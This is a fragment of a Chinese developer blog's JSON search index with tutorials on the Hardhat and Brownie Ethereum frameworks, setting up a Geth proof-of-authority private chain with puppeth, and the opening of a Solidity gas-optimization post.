ethereum-waffle chai @nomiclabs/hardhat-ethers ethers ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:1:3","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"创建项目 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"初始化项目 yarn hardhat 888 888 888 888 888 888 888 888 888 888 888 888 888 888 888 8888888888 8888b. 888d888 .d88888 88888b. 8888b. 888888 888 888 \"88b 888P\" d88\" 888 888 \"88b \"88b 888 888 888 .d888888 888 888 888 888 888 .d888888 888 888 888 888 888 888 Y88b 888 888 888 888 888 Y88b. 888 888 \"Y888888 888 \"Y88888 888 888 \"Y888888 \"Y888 Welcome to Hardhat v2.8.0 ? What do you want to do? ... \u003e Create a basic sample project #示例项目 Create an advanced sample project Create an advanced sample project that uses TypeScript Create an empty hardhat.config.js #纯净项目 Quit ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:1","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"验证项目 yarn hardhat Hardhat version 2.8.0 Usage: hardhat [GLOBAL OPTIONS] \u003cTASK\u003e [TASK OPTIONS] GLOBAL OPTIONS: --config A Hardhat config file. --emoji Use emoji in messages. --help Shows this message, or a task's help if its name is provided --max-memory The maximum amount of memory that Hardhat can use. --network The network to connect to. --show-stack-traces Show stack traces. --tsconfig A TypeScript config file. --verbose Enables Hardhat verbose logging --version Shows hardhat's version. AVAILABLE TASKS: accounts Prints the list of accounts check Check whatever you need clean Clears the cache and deletes all artifacts compile Compiles the entire project, building all artifacts console Opens a hardhat console flatten Flattens and prints contracts and their dependencies help Prints this message node Starts a JSON-RPC server on top of Hardhat Network run Runs a user-defined script after compiling the project test Runs mocha tests To get help for a specific task run: npx hardhat help [task] ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:2","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"项目结构 contracts:合约源文件 scripts:合约部署、交互等自动化脚本 hardhat.config.js:hardhat配置文件 test:合约测试文件 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:3","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"编译项目 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"修改编译器版本 module.exports = { solidity: \"0.8.10\", }; ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:1","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"编译源码 编译contracts/下的源文件，如果非初次编译，那么会编译受影响的文件和相关文件。 yarn hardhat compile ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:2","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"清除缓存与编译 yarn hardhat clean ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:3","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"artifacts artifacts:存放编译合约后生成的文件 contractName:合约名称 abi:abi的json描述 bytecode:0x前缀的十六进制字节码，如果不可部署，则为\"0x\"\\，运行时字节码和创建字节码的总称 depoyedBytecode:运行时字节码 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:4","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"控制台 yarn hardhat console ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:4:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"合约测试 合约测试使用waffle框架，其整合了ether.js、mocha、chai。测试会执行test/下的测试脚本 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"测试脚本 const { expect } = require(\"chai\"); //chai断言库 const { ethers } = require(\"hardhat\"); //加载hardhat库 //遵循mocha标准测试结构 describe(\"Greeter\", function () { it(\"Should return the new greeting once it's changed\", async function () { // 获得自定义地址 const [owner,addr1] = await ethers.getSigner(); // Promise异步-获取合约的实例工厂 const Greeter = await ethers.getContractFactory(\"Greeter\"); // Promise异步-传入参数初始化合约，获取实例 const greeter = await Greeter.deploy(\"Hello, world!\"); // Promise异步-等待部署成功 await greeter.deployed(); // 调用greet()方法,通过chai断言 expect(await greeter.greet()).to.equal(\"Hello, world!\"); // 调用setGreeting方法 const setGreetingTx = await greeter.connect(addr1).setGreeting(\"Hola, levy!\"); // wait until the transaction is mined await setGreetingTx.wait(); // 判断设置的值是否正确 expect(await greeter.greet()).to.equal(\"Hola, levy!\"); }); }); ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:1","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Hardhat Network运行测试 yarn hardhat test ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:2","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Ganache测试 安装ganache plugin npm install --save-dev @nomiclabs/hardhat-ganache 在hardhat.config.js加入 require(\"@nomiclabs/hardhat-ganache\"); 部署 yarn hardhat --network ganache test ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:3","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"测试网络部署 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:4","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"合约部署 ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:0","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"部署脚本 async function main() { // We get the contract to deploy const Greeter = await ethers.getContractFactory(\"Greeter\"); const greeter = await Greeter.deploy(\"Hello, Hardhat!\"); console.log(\"Greeter deployed to:\", greeter.address); } main() .then(() =\u003e process.exit(0)) .catch((error) =\u003e { console.error(error); process.exit(1); }); ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:1","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"本地网络部署 先启用一个本地网络 yarn hardhat node 另启一个终端，部署在本地网络中 yarn hardhat run --network localhost scripts/deploy.js ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:2","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Ganache部署 安装ganache plugin npm install --save-dev @nomiclabs/hardhat-ganache 在hardhat.config.js加入 require(\"@nomiclabs/hardhat-ganache\"); 部署 yarn hardhat run --network ganache scripts/deploy.js ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:3","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"测试网络部署 在infura注册以太坊网关，用于访问链上网络 在hardhat.config.js中配置网络 networks: { hardhat: { }, rinkeby: { url: \"\u003cinfura_api\u003e\", accounts: [privateKey1, privateKey2, ...] } }, 部署 yarn hardhat run --network \u003cyour-network\u003e scripts/deploy.js ","date":"2021-11-20","objectID":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:4","tags":["solidity","ethereum"],"title":"Hardhat简明教程","uri":"/posts/hardhat%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":" 参考链接： web3.py eth-brownie Truffle vs Hardhat vs Brownie — Let’s have a look yearn.finance ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:0:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Brownie? Brownie是一个基于Python的以太坊智能合开发和测试框架。 下面是Medium作者Mir AbdulHaseeb对于该框架的一些总结。 技术方面：Python、Web3.py、区块链分叉、Etherscan插件、Vype支持 区块链环境：Ganache/本地、测试网、主网 含测试框架 维护：非常积极 支持：积极 开源 对于我个人来说，Brownie的使用体验相较于Truffle和hardhat确实要更简洁。聚合器龙头YFI就是使用的Brownie框架，其中合约的测试仅需要用到Pytest和Brownie库就可完成全部编码。通过Python脚本完成智能合约的部署工作。 对于那些不习惯JavaScript进行合约测试的工程师，Brownie是最合适不过的了。 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:1:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"环境配置 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"依赖 python3 version 3.6 or greater, python3-dev ganache-cli - tested with version 6.12.2 pipx Microsoft Visual C++ 14.0 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:1","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"pipx安装 python -m pip install --user pipx python -m pipx ensurepath ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:2","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Brownie安装 pipx install eth-brownie #安装完成后输入brownie验证是否安装成功 brownie --version 如果Brownie安装中出现\"Microsoft Visual C++ 14.0 is required\"可以参考此篇解决方案https://zhuanlan.zhihu.com/p/165008313 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:2:3","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"新建项目 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"创建一个空的项目 brownie init ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:1","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"从模板中构建项目 brownie bake token 更多模板请查看https://github.com/brownie-mix ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:2","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"项目结构 contracts/: 合约文件 interfaces/: 接口文件 scripts/: 部署和交互脚本 tests/: 测试脚本 build/:编译后的文件和单元测试结果 reports:GUI中使用的JSON报告文件 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:3:3","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"编译合约 brownie会编译所有在contracts/中存在的合约文件 brownie compile ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:4:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"合约交互 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"方法1-控制台 控制器与Python解释器十分类似，我们可以在控制台直接调用Python代码。 brownie console ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:1","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"方法2-运行脚本 除了console交互的方式，我们还可以使用Brownie API在scripts/中编写自动化脚本。 脚本样例： from brownie import Token, accounts def main(): Token.deploy(\"Test Token\", \"TST\", 18, 1e23, {'from': accounts[0]}) 运行脚本： #execute a script from the command line brownie run \u003cscript\u003e[function] # executes the main() function within scripts/token.py run('\u003cscript\u003e') ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:5:2","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"脚本测试 测试脚本存储在tests/中，我们可以用以下操作完成测试 brownie test ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:6:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"扩展内容 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:7:0","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Brownie包管理 Brownie v1.17.2 - Python development framework for Ethereum Usage: brownie pm \u003ccommand\u003e [\u003carguments\u003e ...] [options] Commands: list List available accounts install \u003curi\u003e [version] Install a new package clone \u003cid\u003e [path] Make a copy of an installed package delete \u003cid\u003e Delete an installed package Options: --help -h Display this message Manager for packages installed from ethPM and Github. Installed packages can be added as dependencies and imported into your own projects. See https://eth-brownie.readthedocs.io/en/stable/package-manager.html for more information on how to install and use packages. brownie支持从ethPM和Github下载软件包并安装。 从Github安装 OpenZeppelin合约3.0.0: #包标准：ORGANIZATION/REPOSITORY@[VERSION] brownie pm install OpenZeppelin/openzeppelin-contracts@3.0.0 从ethPM安装: #包标准：ethpm://CONTRACT_ADDRESS]:[CHAIN_ID/PACKAGE_NAME@[VERSION] brownie pm install ethpm://defi.snakecharmers.eth:1/compound@1.1.0 安装到当前目录： brownie pm clone OpenZeppelin/openzeppelin-contracts@3.0.0 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:7:1","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Brownie GUI brownie gui #命令行 GUI() #控制台 ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:7:2","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["sc"],"content":"Accounts Container 进入控制台后，Brownie提供账户命令交互功能。常见的命令如下： accounts(a/Accounts):列出本地账户 accounts[0]:第一个账户 #余额 accounts[1].balance():账户余额 #转账 accounts[0].transfer(accounts[1], \"10 ether\"):给accounts[1]转账。字符串可以指定单位，数值默认单位为wei #添加 accounts.add() accounts.add('\u003cprivate_key\u003e') ","date":"2021-11-15","objectID":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/:7:3","tags":["solidity","ethereum"],"title":"Brownie简明教程","uri":"/posts/brownie%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"},{"categories":["ethereum"],"content":"搭建以太坊联盟链 ","date":"2019-09-05","objectID":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/:1:0","tags":["deploy","geth"],"title":"Geth POA联盟链搭建","uri":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/"},{"categories":["ethereum"],"content":"创建节点目录 [root@google01 private-POA-chian]# mkdir node-1 node-2 node-3 [root@google01 private-POA-chian]# ls node-1 node-2 node-3 ","date":"2019-09-05","objectID":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/:1:1","tags":["deploy","geth"],"title":"Geth POA联盟链搭建","uri":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/"},{"categories":["ethereum"],"content":"新建账户 [root@google01 private-POA-chian]# geth --datadir ./node-1/data account new [root@google01 private-POA-chian]# geth --datadir ./node-2/data account new [root@google01 private-POA-chian]# geth --datadir ./node-3/data account new 创建的地址 node-1：88b34c24E8F727b44C17065A26B76Bc31CF2c029 node-2：241f173D632C57773B552953Fe1f2821d24BE072 node-3：Aae8AD28560E70f81815ff5B5AD9d65dC4E7Ca22 ","date":"2019-09-05","objectID":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/:1:2","tags":["deploy","geth"],"title":"Geth POA联盟链搭建","uri":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/"},{"categories":["ethereum"],"content":"puppeth初始化区块 输入链名称 [root@google01 private-POA-chian]# puppeth +-----------------------------------------------------------+ | Welcome to puppeth, your Ethereum private network manager | | | | This tool lets you create a new Ethereum network down to | | the genesis block, bootnodes, miners and ethstats servers | | without the hassle that it would normally entail. | | | | Puppeth uses SSH to dial in to remote servers, and builds | | its network components out of Docker containers using the | | docker-compose toolset. | +-----------------------------------------------------------+ Please specify a network name to administer (no spaces, hyphens or capital letters please) \u003e test Sweet, you can set this via --network=test next time! INFO [11-26|14:35:42.756] Administering Ethereum network name=test WARN [11-26|14:35:42.756] No previous configurations found path=/root/.puppeth/test 新建区块-\u003e选择POA算法-\u003e出块时间10秒 What would you like to do? (default = stats) 1. Show network stats 2. Configure new genesis 3. Track new remote server 4. Deploy network components \u003e 2 What would you like to do? (default = create) 1. Create new genesis from scratch 2. Import already existing genesis \u003e 1 Which consensus engine to use? (default = clique) 1. Ethash - proof-of-work 2. Clique - proof-of-authority \u003e 2 How many seconds should blocks take? (default = 15) \u003e 10 选择密封块账户 Which accounts are allowed to seal? (mandatory at least one) \u003e 0x88b34c24E8F727b44C17065A26B76Bc31CF2c029 \u003e 0x241f173D632C57773B552953Fe1f2821d24BE072 \u003e 0xAae8AD28560E70f81815ff5B5AD9d65dC4E7Ca22 至于什么是seal a block可以参考stackexchange的回答https://ethereum.stackexchange.com/questions/6093/what-does-it-mean-to-seal-a-block 选择区块奖励账户 Which accounts should be pre-funded? (advisable at least one) \u003e 0x88b34c24E8F727b44C17065A26B76Bc31CF2c029 \u003e 0x241f173D632C57773B552953Fe1f2821d24BE072 \u003e 0xAae8AD28560E70f81815ff5B5AD9d65dC4E7Ca22 设置预编译地址奖励及链ID Should the precompile-addresses (0x1 .. 0xff) be pre-funded with 1 wei? (advisable yes) \u003e yes Specify your chain/network ID if you want an explicit one (default = random) \u003e 15 预编译地址的用处https://ethereum.stackexchange.com/questions/68056/puppeth-precompile-addresses “When running sha256, ripemd160 or ecrecover on a private blockchain, you might encounter Out-of-Gas. This is because these functions are implemented as “precompiled contracts” and only really exist after they receive the first message (although their contract code is hardcoded). Messages to non-existing contracts are more expensive and thus the execution might run into an Out-of-Gas error. A workaround for this problem is to first send Wei (1 for example) to each of the contracts before you use them in your actual contracts. This is not an issue on the main or test net.” 导出配置 What would you like to do? (default = stats) 1. Show network stats 2. Manage existing genesis 3. Track new remote server 4. Deploy network components \u003e 2 1. Modify existing configurations 2. Export genesis configurations 3. Remove genesis configuration \u003e 2 Which folder to save the genesis specs into? (default = current) Will create test.json, test-aleth.json, test-harmony.json, test-parity.json \u003e INFO [11-26|14:59:18.889] Saved native genesis chain spec path=test.json ERROR[11-26|14:59:18.889] Failed to create Aleth chain spec err=\"unsupported consensus engine\" ERROR[11-26|14:59:18.889] Failed to create Parity chain spec err=\"unsupported consensus engine\" INFO [11-26|14:59:18.890] Saved genesis chain spec client=harmony path=test-harmony.json ","date":"2019-09-05","objectID":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/:1:3","tags":["deploy","geth"],"title":"Geth POA联盟链搭建","uri":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/"},{"categories":["ethereum"],"content":"私链搭建 加载配置 geth --datadir node-1/data init test.json geth --datadir node-2/data init test.json geth --datadir node-3/data init test.json 启动区块链 geth --datadir ./node-1/data/ --port 1185 geth --datadir ./node-2/data/ --port 1186 geth --datadir ./node-3/data/ --port 1187 [root@google01 private-POA-chian]# screen -ls There are screens on: 4439.node-3 (Detached) 4397.node-2 (Detached) 4298.node-1 (Detached) 节点建立通信 登录node-1,获取节点信息 [root@google01 private-POA-chian]# geth attach ipc:node-1/data/geth.ipc Welcome to the Geth JavaScript console! instance: Geth/v1.10.12-stable-6c4dc6c3/linux-amd64/go1.17.2 coinbase: 0x88b34c24e8f727b44c17065a26b76bc31cf2c029 at block: 0 (Fri Nov 26 2021 14:48:33 GMT+0800 (CST)) datadir: /home/fqc/projects/blockchain/ethereum/private-POA-chian/node-1/data modules: admin:1.0 clique:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0 To exit, press ctrl-d or type exit \u003e \u003e admin.nodeInfo.enode \"enode://567c2b4de752396bab3fee6d2f31fb705c1a3b40f929cc4852961b5ddd15ad47c580ee2cb35a596351e125c8210c345aee19b104e5b66596c108c24ac9cb3329@115.29.190.53:1185\" 登录node-2、node-3建立peer通信 admin.addPeer(\"enode://567c2b4de752396bab3fee6d2f31fb705c1a3b40f929cc4852961b5ddd15ad47c580ee2cb35a596351e125c8210c345aee19b104e5b66596c108c24ac9cb3329@127.0.0.1:1185\") 登录node-1确定是否成功 \u003e net.peerCount \u003e admin.peers 测试 登录node-1，查询账户余额 \u003e web3.fromWei(eth.getBalance(eth.accounts[0]),'ether') 9.04625697166532776746648320380374280103671755200316906558262375061821325312e+56 转账交易 \u003e personal.unlockAccount(eth.accounts[0]) Unlock account 0x88b34c24e8f727b44c17065a26b76bc31cf2c029 Passphrase: true \u003e eth.sendTransaction({from:eth.accounts[0], to:\"241f173D632C57773B552953Fe1f2821d24BE072\", value:20000}) \"0x8216e70d056ff0e02701d75b0059489eb7b293128b8a19ae393590b5b05a7281\" 查询交易。可以看到区块还未打包，因此需要开启挖矿节点 \u003e eth.getTransaction(\"0xa86e66aa6b9b35672f0f9d235d258b681a13e03b232a97c6e994db7167f8f1e6\") { blockHash: null, blockNumber: null, from: \"0x88b34c24e8f727b44c17065a26b76bc31cf2c029\", gas: 21000, gasPrice: 1000000000, hash: \"0xa86e66aa6b9b35672f0f9d235d258b681a13e03b232a97c6e994db7167f8f1e6\", input: \"0x\", nonce: 4, r: \"0x46ed1d6d2c8f28e5db451d061303051aca58470a1ed4126e95e5af58345d1bc7\", s: \"0x5a722e13a7524a8e0ca4ae4c75b3619575da921ece96bde2702c7cb720117383\", to: \"0x241f173d632c57773b552953fe1f2821d24be072\", transactionIndex: null, type: \"0x0\", v: \"0x41\", value: 1e+66 } \u003e txpool.status #查看交易状态 { pending: 6, queued: 0 } 启动挖矿 miner.start() eth.hashrate #查看挖矿状态 ","date":"2019-09-05","objectID":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/:1:4","tags":["deploy","geth"],"title":"Geth POA联盟链搭建","uri":"/posts/geth-poa%E8%81%94%E7%9B%9F%E9%93%BE%E6%90%AD%E5%BB%BA/"},{"categories":["ethereum"],"content":" 本文作者：@7Levy 参考链接： How to optimize gas cost in a Solidity smart contract? 6 tips https://ethereum.stackexchange.com/questions/99971/what-does-enable-optimization-mean-in-remix-and-what-does-it-do/99973 https://ethereum.stackexchange.com/questions/16766/any-reason-not-to-use-browser-soliditys-enable-optimization https://eips.ethereum.org/EIPS/eip-1167 https://github.com/optionality/clone-factory https://ethereum.stackexchange.com/questions/28813/how-to-write-an-optimized-gas-cost-smart-contract/28848 https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6 ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:0:0","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"优化GAS ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:0","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"最小化链上数据 对一个Dapp重要的数据必须放在链上，将非关键部分的代码放在链下。 ","date":"0001-01-01","objectID":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/:1:1","tags":["solidity","ethereum"],"title":"Master Solidity-极限优化GAS","uri":"/posts/master-solidity-%E6%9E%81%E9%99%90%E4%BC%98%E5%8C%96gas/"},{"categories":["ethereum"],"content":"Solidity optimization 在我们编译solidity智能合约的时候，我们需要指定一个参数来告诉solidity编译器生成优化的字节码。如果你不使用优化参数的话，那么就会花费更多的gas。 在实际的开发中，这种优化方式会更长的编译时间，默认情况下是关闭的。以Hardhat为例，我们可以在配置文件hardhat.config.js中启用，并设置你所期望的运行次数，runs指定了部署代码的每个操作码在合约生命周期内执行的频率。runs较小时(如1)，初始字节码较短，部署成本低，但会导致后期合约执行成本高。runs较大时(如1000)，初始字节码较长且复杂，部署成本更高，但对合约的调用会更便宜。对于这个参数，我们需要针对所写的合约来设置，如果合约只是一次性的代码，设置成1即可。对于ERC20代币之类的合约，设置较大的数字能显著地减少调用成本。 module.exports = { 